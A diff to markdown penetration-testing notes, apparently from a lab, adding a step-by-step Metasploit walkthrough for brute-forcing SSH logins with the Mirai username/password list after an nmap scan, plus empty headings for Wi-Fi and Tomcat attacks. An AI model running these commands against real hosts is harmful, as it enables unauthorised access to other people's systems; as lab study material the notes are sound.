@@ -39,3 +39,48 @@ $ cd exploits/
 $ cd windows/
 $ cd /usr/share/metasploit-framework/modules/exploits/windows/smb
 ```
+
+---
+
+## BruteForcing SSH with Metasploits
+
+192.168.71.131
+
+```bash
+# IN Nmap Terminal
+$ nmap -sV -p- <Target_Ip>
+
+# IN Metasploit Terminal
+$ msfconsole -q
+$ search ssh scanner
+
+# For better search Scanner
+$ use auxiliary/scanner/ssh/ssh_version
+$ show options
+$ set RHOSTS <Target_Ip>
+$ run
+
+# To login the SSH Login
+$ search ssh login
+$ use auxiliary/scanner/ssh/ssh_login
+$ show options
+$ set RHOSTS <Target_IP>
+$ set VERBOSE true
+
+# Set up a Password List
+$ cd /usr/share/wordlists/
+$ set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
+$ run
+
+```
+
+_Done_
+
+---
+
+## WIFI Hacking using rockyou.txt.gz
+
+---
+
+## Attacking Tomcat with Metasploit
+
